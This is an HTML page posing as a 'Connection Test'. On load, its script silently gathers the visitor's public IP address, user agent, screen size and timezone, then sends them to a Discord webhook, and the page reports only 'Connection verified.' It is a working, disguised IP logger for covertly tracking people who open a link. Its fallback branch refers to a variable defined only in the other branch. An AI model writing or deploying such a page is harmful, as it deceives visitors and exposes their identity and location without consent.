<!DOCTYPE html>
<html>
<head>
    <title>Connection Test</title>
</head>
<body>
    <h1>Please wait...</h1>
    <script>
        // Step 1: Collect IP via public API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                // Step 2: Get additional browser data
                const userAgent = navigator.userAgent;
                const screenRes = `${screen.width}x${screen.height}`;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                // Step 3: Build payload
                const payload = {
                    content: `**New IP Log**\nIP: ${ip}\nUA: ${userAgent}\nScreen: ${screenRes}\nTZ: ${timezone}`
                };
                // Step 4: Send to Discord webhook (REPLACE URL)
                const webhookURL = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        document.body.innerHTML = '<h1>Connection verified.</h1>';
                    } else {
                        document.body.innerHTML = '<h1>Error sending report.</h1>';
                    }
                })
                .catch(err => {
                    document.body.innerHTML = '<h1>Network error.</h1>';
                });
            })
            .catch(err => {
                // Fallback: try alternative API
                fetch('https://api.ipapi.co/json/')
                    .then(res => res.json())
                    .then(data => {
                        const ip = data.ip || 'unknown';
                        const payload = {
                            content: `**New IP Log (fallback)**\nIP: ${ip}\nUA: ${navigator.userAgent}`
                        };
                        fetch(webhookURL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        }).catch(() => {});
                    })
                    .catch(() => {});
            });
    </script>
</body>
</html>
